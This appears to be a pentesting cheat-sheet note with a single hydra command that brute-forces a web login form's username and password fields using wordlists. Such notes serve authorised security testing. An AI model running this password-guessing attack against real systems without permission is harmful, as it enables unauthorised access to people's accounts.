# HTTP form bruteforce


```sh
hydra <ip> http-form-post "/index.php:user=^USER^&pass=^PASS^:Bad login" -L users.txt -P pass.txt -t 10 -w 30 -o hydra-http-post-attack.txt
```